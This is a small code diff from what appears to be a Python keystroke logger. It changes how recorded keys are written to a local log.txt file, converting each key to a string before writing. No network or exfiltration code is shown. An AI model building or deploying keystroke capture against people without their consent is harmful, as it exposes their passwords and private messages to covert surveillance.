@@ -23,7 +23,7 @@ def on_press(key):
 def write_file(keys):
     with open("log.txt", "a") as f:
         for key in keys:
-            f.write(key)
+            f.write(str(key))
 
 #function to record when a key is released
 def on_release(key):
